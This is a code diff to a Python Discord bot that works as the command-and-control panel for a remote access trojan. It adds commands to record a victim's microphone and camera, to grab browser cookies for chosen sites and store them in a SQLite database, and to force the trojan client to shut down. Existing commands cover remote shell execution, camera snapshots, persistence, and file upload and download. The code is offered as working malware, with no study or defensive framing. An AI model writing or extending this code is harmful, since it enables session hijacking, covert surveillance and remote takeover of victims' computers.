@@ -1,4 +1,5 @@
 import os
+import sqlite3
 import json
 import asyncio
 import aiohttp
@@ -61,13 +62,32 @@ async def on_message(message):
 
     # Kill command to shut down the RAT client (now !killclient)
     if message.content.strip() == f"{COMMAND_PREFIX}killclient":
-        shutdown_resp = await forward_command("shutdown")
-        await message.channel.send("Initiating shutdown of RAT client.")
+        max_attempts = 3
+        for attempt in range(1, max_attempts + 1):
+            shutdown_resp = await forward_command("shutdown")
+            if shutdown_resp.get("error"):
+                if attempt < max_attempts:
+                    await asyncio.sleep(1)
+                    continue
+                else:
+                    await message.channel.send(f"Failed to shutdown RAT client after {max_attempts} attempts: {shutdown_resp['error']}")
+                    break
+            else:
+                await message.channel.send("RAT client shutdown successful.")
+                break
         return
 
     # Kill command to shut down only the Discord bot (!killbot)
     if message.content.strip() == f"{COMMAND_PREFIX}killbot":
         await message.channel.send("Shutting down Discord bot.")
+        await bot.close()
+        return
+
+    # Force kill command to shutdown RAT client and bot regardless of response (!forcekill)
+    if message.content.strip() == f"{COMMAND_PREFIX}forcekill":
+        # Send shutdown command without checking response
+        await forward_command("shutdown")
+        await message.channel.send("Force shutdown command sent. Shutting down Discord bot.")
         await bot.close()
         return
 
@@ -82,9 +102,37 @@ async def on_message(message):
 
     # Kill command to shut down both the RAT client and the Discord bot (!kill)
     if message.content.strip() == f"{COMMAND_PREFIX}kill":
-        shutdown_resp = await forward_command("shutdown")
-        await message.channel.send("Initiating shutdown of RAT client and Discord bot.")
+        max_attempts = 3
+        for attempt in range(1, max_attempts + 1):
+            shutdown_resp = await forward_command("shutdown")
+            if shutdown_resp.get("error"):
+                if attempt < max_attempts:
+                    await asyncio.sleep(1)  # wait before retry
+                    continue
+                else:
+                    await message.channel.send(f"Failed to shutdown RAT client after {max_attempts} attempts: {shutdown_resp['error']}")
+                    break
+            else:
+                await message.channel.send("RAT client shutdown successful. Shutting down Discord bot.")
+                break
         # Gracefully close the bot
+        await bot.close()
+        return
+
+    # Ensure shutdown command to force shutdown until success (!ensureshutdown)
+    if message.content.strip() == f"{COMMAND_PREFIX}ensureshutdown":
+        max_attempts = 5
+        for attempt in range(1, max_attempts + 1):
+            shutdown_resp = await forward_command("shutdown")
+            if shutdown_resp.get("error"):
+                await message.channel.send(f"Attempt {attempt}/{max_attempts} failed: {shutdown_resp['error']}")
+                await asyncio.sleep(1)
+                continue
+            else:
+                await message.channel.send("RAT client shutdown successful.")
+                break
+        else:
+            await message.channel.send("Failed to shutdown RAT client after multiple attempts.")
         await bot.close()
         return
     # Persistence command to toggle startup persistence (!persistence on/off)
@@ -107,18 +155,21 @@ async def on_message(message):
         parts = message.content.split(maxsplit=1)
         if len(parts) == 1:
             help_text = (
-                "**Available commands:**\n"
-                f"{COMMAND_PREFIX}killclient - Shut down the RAT client only.\n"
-                f"{COMMAND_PREFIX}kill - Shut down both the RAT client and this Discord bot.\n"
-                f"{COMMAND_PREFIX}killbot - Shut down the Discord bot only.\n"
-                f"{COMMAND_PREFIX}persistence <on|off> - Toggle persistence on/off.\n"
-                f"{COMMAND_PREFIX}testconnection - Test connection to the RAT client.\n"
-                f"{COMMAND_PREFIX}shell <command> - Execute a shell command on the RAT client.\n"
-                f"{COMMAND_PREFIX}snap - Capture a photo from the camera.\n"
-                f"{COMMAND_PREFIX}url <url> - Open a URL in the default browser.\n"
-                f"{COMMAND_PREFIX}upload <file_path> - Upload a file from the client.\n"
-                f"{COMMAND_PREFIX}download <url> <dest_path> - Download a file to the client.\n"
-                f"{COMMAND_PREFIX}help [command] - Show this help or detailed usage."
+            "**Available commands:**\n"
+            f"{COMMAND_PREFIX}killclient - Shut down the RAT client only.\n"
+            f"{COMMAND_PREFIX}kill - Shut down both the RAT client and this Discord bot.\n"
+            f"{COMMAND_PREFIX}killbot - Shut down the Discord bot only.\n"
+            f"{COMMAND_PREFIX}persistence <on|off> - Toggle persistence on/off.\n"
+            f"{COMMAND_PREFIX}testconnection - Test connection to the RAT client.\n"
+            f"{COMMAND_PREFIX}shell <command> - Execute a shell command on the RAT client.\n"
+            f"{COMMAND_PREFIX}snap - Capture a photo from the camera.\n"
+            f"{COMMAND_PREFIX}record <start|stop> [audio|video|both] - Record audio/video.\n"
+            f"{COMMAND_PREFIX}url <url> - Open a URL in the default browser.\n"
+            f"{COMMAND_PREFIX}upload <file_path> - Upload a file from the client.\n"
+            f"{COMMAND_PREFIX}download <url> <dest_path> - Download a file to the client.\n"
+            f"{COMMAND_PREFIX}cookiegrab <url> - Retrieve cookies from a given URL.\n"
+            f"{COMMAND_PREFIX}cookieslist - List stored cookie sites.\n"
+            f"{COMMAND_PREFIX}help [command] - Show this help or detailed usage."
             )
             await message.channel.send(help_text)
         else:
@@ -133,12 +184,73 @@ async def on_message(message):
                 "help": f"Usage: {COMMAND_PREFIX}help [command]\nExample: {COMMAND_PREFIX}help killclient – shows detailed help for `killclient`."
             }
             await message.channel.send(details.get(cmd, "Command not recognized. Use !help to see available commands."))
+        # (no return here to allow further command processing)
+
+    # Cookie grab command to retrieve cookies from a given URL (!cookiegrab <url>)
+    if message.content.startswith(f"{COMMAND_PREFIX}cookiegrab ") or message.content.startswith(f"{COMMAND_PREFIX}cookie grab "):
+        # Determine URL based on which prefix was used
+        if message.content.startswith(f"{COMMAND_PREFIX}cookiegrab "):
+            url = message.content[len(f"{COMMAND_PREFIX}cookiegrab "):].strip()
+        else:
+            url = message.content[len(f"{COMMAND_PREFIX}cookie grab "):].strip()
+        if not url:
+            await message.channel.send("Usage: !cookiegrab <url>")
+            # (no return here to allow further command processing)
+            # Continue processing
+        # Forward command to RAT client
+        resp = await forward_command(f"cookiegrab {url}")
+        if "error" in resp:
+            await message.channel.send(f"Error retrieving cookies: {resp['error']}")
+            return
+        cookies = resp.get("cookies", "")
+        # Store cookies in SQLite DB
+        try:
+            conn = sqlite3.connect('cookies.db')
+            c = conn.cursor()
+            c.execute('CREATE TABLE IF NOT EXISTS cookies (site TEXT PRIMARY KEY, data TEXT)')
+            c.execute('INSERT OR REPLACE INTO cookies (site, data) VALUES (?, ?)', (url, cookies))
+            conn.commit()
+            conn.close()
+            await message.channel.send(f"Cookies for {url} stored successfully.")
+        except Exception as e:
+            await message.channel.send(f"Failed to store cookies: {e}")
+        return
+
+    # Cookies list command to list all stored sites (!cookieslist)
+    if message.content.strip() == f"{COMMAND_PREFIX}cookieslist":
+        try:
+            conn = sqlite3.connect('cookies.db')
+            c = conn.cursor()
+            c.execute('SELECT site FROM cookies')
+            rows = c.fetchall()
+            conn.close()
+            if not rows:
+                await message.channel.send("No cookies stored.")
+            else:
+                sites = ", ".join([row[0] for row in rows])
+                await message.channel.send(f"Stored cookie sites: {sites}")
+        except Exception as e:
+            await message.channel.send(f"Failed to retrieve cookie list: {e}")
         return
 
     # Determine which command to forward based on the prefix
     cmd = message.content.strip()
     if cmd.startswith(f"{COMMAND_PREFIX}snap"):
         command_body = "snap"
+    elif cmd.startswith(f"{COMMAND_PREFIX}record "):
+        parts = cmd.split()
+        if len(parts) >= 3 and parts[1].lower() == "start":
+            mode = parts[2].lower()
+            if mode in ("audio", "video", "both"):
+                command_body = f"record start {mode}"
+            else:
+                await message.channel.send("Invalid record start option. Use audio, video, or both.")
+                return
+        elif len(parts) >= 2 and parts[1].lower() == "stop":
+            command_body = "record stop"
+        else:
+            await message.channel.send("Invalid record command. Use '!record start <audio|video|both>' or '!record stop'.")
+            return
     elif cmd.startswith(f"{COMMAND_PREFIX}url "):
         arg = cmd[len(f"{COMMAND_PREFIX}url "):].strip()
         command_body = f"url {arg}"
@@ -151,7 +263,7 @@ async def on_message(message):
     elif cmd.startswith(f"{COMMAND_PREFIX}shell "):
         command_body = cmd[len(f"{COMMAND_PREFIX}shell "):].strip()
     else:
-        await message.channel.send("Invalid command format. Use !snap, !url <url>, !upload <path>, !download <url> <dest>, or !shell <command>.")
+        await message.channel.send("Invalid command format. Use !snap, !record start <audio|video|both>, !record stop, !url <url>, !upload <path>, !download <url> <dest>, or !shell <command>.")
         return
 
     if not command_body:
@@ -177,6 +289,10 @@ async def on_message(message):
 
 # Run the bot
 if __name__ == "__main__":
+    # Verify that the Discord token appears valid (basic format check)
     if not DISCORD_TOKEN:
         raise EnvironmentError("DISCORD_BOT_TOKEN not set in .env")
+    # Basic validation: Discord bot tokens are three parts separated by '.' and should not contain placeholder text
+    if "YOUR_DISCORD_BOT_TOKEN" in DISCORD_TOKEN or DISCORD_TOKEN.count(".") != 2:
+        raise EnvironmentError("DISCORD_BOT_TOKEN appears invalid. Please replace it with a real token from the Discord Developer Portal.")
     bot.run(DISCORD_TOKEN)
